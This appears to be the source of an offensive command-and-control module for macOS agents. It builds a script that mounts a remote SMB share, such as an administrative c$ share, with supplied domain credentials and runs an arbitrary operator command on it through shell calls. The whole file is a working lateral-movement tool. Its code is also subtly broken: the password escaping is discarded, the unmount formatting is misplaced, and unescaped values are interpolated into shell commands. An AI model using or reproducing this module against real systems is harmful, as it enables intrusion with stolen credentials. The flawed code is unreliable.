class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'SMB Mount',
            'Author': ['@424f424f'],
            'Description': 'This module will attempt mount an smb share and execute a command on it.',
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': ['']
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Domain' : {
                'Description'   :   'Domain',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   'Username',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ShareName' : {
                'Description'   :   'Share to mount. e.g. 192.168.1.1/c$',
                'Required'      :   True,
                'Value'         :   ''
            },
            'MountPoint' : {
                'Description'   :   'Directory to mount on target.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Command' : {
                'Description'   :   'Command to run.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        domain = self.options['Domain']['Value']
        username = self.options['UserName']['Value']
        password = self.options['Password']['Value']
        sharename = self.options['ShareName']['Value']
        mountpoint = self.options['MountPoint']['Value']
        command = self.options['Command']['Value']
        script = """
import sys, os, subprocess, re
username = "%s"
domain = "%s"
password = "%s"
sharename = "%s"
mountpoint = "%s"
command = "%s"
password.replace('!','%%21')
password.replace('#','%%23')
password.replace('$','%%24')
cmd = \"""mkdir /Volumes/{}\""".format(mountpoint)
subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
cmd1 = \"""mount_smbfs //'{};{}:{}'@{} /Volumes/{}""\".format(domain,username,password,sharename,mountpoint)
print subprocess.Popen(cmd1, shell=True, stdout=subprocess.PIPE).stdout.read()
print ""
cmd2 = \"""{} /Volumes/{}""\".format(command,mountpoint)
print subprocess.Popen(cmd2, shell=True, stdout=subprocess.PIPE).stdout.read()
print ""
print ""
print subprocess.Popen('diskutil unmount force /Volumes/{}', shell=True, stdout=subprocess.PIPE).stdout.read().format(mountpoint)
print ""
print "Finished"
""" % (username, domain, password, sharename, mountpoint, command)
        return script